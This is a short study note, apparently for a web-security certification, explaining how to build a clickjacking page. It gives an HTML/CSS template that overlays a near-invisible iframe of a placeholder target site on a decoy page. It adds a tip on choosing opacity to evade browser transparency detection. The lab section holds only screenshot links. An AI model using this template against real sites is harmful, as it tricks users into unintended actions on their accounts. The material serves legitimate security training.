---
title: Constructing a Basic Clickjacking Attack
author: Jon Marien
created: 2026-02-07
published: 2026-02-07
tags:
  - certs
  - bscp
  - burp
---

| Title                                    | Author     | Created           | Published         | Tags                                                   |
| ---------------------------------------- | ---------- | ----------------- | ----------------- | ------------------------------------------------------ |
| Constructing a Basic Clickjacking Attack | Jon Marien | February 07, 2026 | February 07, 2026 | [[#certs\|#certs]], [[#bscp\|#bscp]], [[#burp\|#burp]] |

# Example
Clickjacking attacks use CSS to create and manipulate layers. The attacker incorporates the target website as an `iframe` layer overlaid on the decoy website. An example using the style tag and parameters is as follows: 
```html
<head>
	<style>
		#target_website {
			position:relative;
			width:128px;
			height:128px;
			opacity:0.00001;
			z-index:2;
			}
		#decoy_website {
			position:absolute;
			width:300px;
			height:400px;
			z-index:1;
			}
	</style>
</head>
...
<body>
	<div id="decoy_website">
	...decoy web content here...
	</div>
	<iframe id="target_website" src="https://vulnerable-website.com">
	</iframe>
</body>
```
The target website iframe is positioned within the browser so that there is a precise overlap of the target action with the decoy website using appropriate width and height position values. 

Absolute and relative position values are used to ensure that the target website accurately overlaps the decoy regardless of screen size, browser type and platform. 

The z-index determines the stacking order of the iframe and website layers. 

The opacity value is defined as `0.0` (or close to `0.0`) so that the iframe content is transparent to the user. Browser clickjacking protection might apply threshold-based iframe transparency detection (for example, Chrome version `76` includes this behavior but Firefox does not). 

The attacker selects opacity values so that the desired effect is achieved without triggering protection behaviors. 

---

## Lab
![](../../../../Resources/Constructing%20a%20Basic%20Clickjacking%20Attack-1770504385254.webp)

![](../../../../Resources/Constructing%20a%20Basic%20Clickjacking%20Attack-1770504407374.webp)

sorry about the screenshots I had HDR on :(

---
